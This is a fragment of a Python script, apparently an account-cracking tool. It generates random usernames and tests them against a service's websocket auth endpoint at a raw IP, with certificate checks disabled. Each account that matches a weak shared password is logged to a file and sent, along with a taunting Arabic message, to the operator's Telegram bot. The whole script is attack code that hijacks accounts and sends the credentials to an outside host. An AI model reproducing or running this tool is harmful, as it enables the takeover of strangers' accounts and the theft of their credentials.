...
own_id = input("ID Telegram: ")
tele_bot = input("Token Bot: ")
...
def create():
    ...
    user = (
        str(random.choice('qwertyuioplkjhgfdsazxcvbnm')[0]) +
        str(''.join(random.choice(ch) for i in range(7)))
    )
    ...
    ws = websocket.create_connection(
        "wss://51.79.208.190/Auth", header=headers, sslopt={"cert_reqs": ssl.CERT_NONE}
    )
    ...
    if '"comment":"Exists"' in str(decoded_data):
        ...
        created += 1
        tlg_message = f" صدتلك حساب فوللل\n رمز الحسابات hhhh\nاسم المستخدم {user}"
        with open("ppp88.txt", "a") as file:
            file.write(f"{user}\n")
        requests.post(f"https://api.telegram.org/bot{tele_bot}/sendmessage?chat_id={own_id}&text={tlg_message}")
